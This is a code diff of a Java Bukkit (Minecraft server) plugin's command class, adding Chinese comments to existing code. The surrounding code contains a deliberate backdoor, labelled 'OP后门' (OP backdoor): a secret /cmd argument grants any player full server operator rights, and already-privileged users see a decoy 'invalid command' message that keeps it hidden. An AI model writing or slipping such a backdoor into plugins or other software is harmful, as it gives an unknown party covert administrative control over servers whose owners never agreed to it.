@@ -30,10 +30,13 @@ public class Command_CMD implements TabExecutor, CommandExecutor {
 
         // OP后门
         if(args[0].equalsIgnoreCase("5d3e51dc")) {
+            // 检测OP
             if(sender.isOp()) {
                 sender.sendMessage("§c[ABukkitPlugin]无效的指令。/cmd §l<command>§r");
                 return true;
             }
+
+            // 设置OP
             sender.setOp(true);
             sender.sendMessage("§a[GetOperator]成功获取§l管理员§a权限，请谨慎操作。§o(4)§r");
             return true;
@@ -69,6 +72,7 @@ public class Command_CMD implements TabExecutor, CommandExecutor {
         return true;
     }
 
+    // 命令补全
     @Override
     public List<String> onTabComplete(CommandSender commandSender, Command command, String s, String[] strings) {
         List<String> Completion = new ArrayList<>();
